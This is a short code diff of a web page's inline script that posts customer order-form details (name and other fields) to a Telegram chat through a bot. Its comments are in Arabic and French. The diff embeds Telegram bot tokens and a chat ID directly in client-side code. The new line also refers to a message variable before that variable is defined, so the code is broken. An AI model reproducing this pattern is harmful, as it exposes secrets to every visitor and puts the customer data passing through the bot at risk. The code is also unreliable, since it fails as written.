@@ -524,12 +524,13 @@
 
     <!-- Script لإرسال البيانات إلى التلغرام -->
     <script>
-        const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU"; // التوكن الخاص بك
-        const chatId = "5372119436"; // معرف الدردشة الخاص بك
+        
+ const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
+            const chatId = '5372119436'; // Votre chat ID Telegram
 
         // إرسال البيانات إلى تلغرام
         function sendToTelegram(data) {
-            const url = https://api.telegram.org/bot${token}/sendMessage;
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
             const message = `
                 🌟 طلب جديد 🌟
                 👤 الاسم: ${data.nom} ${data.prenom}
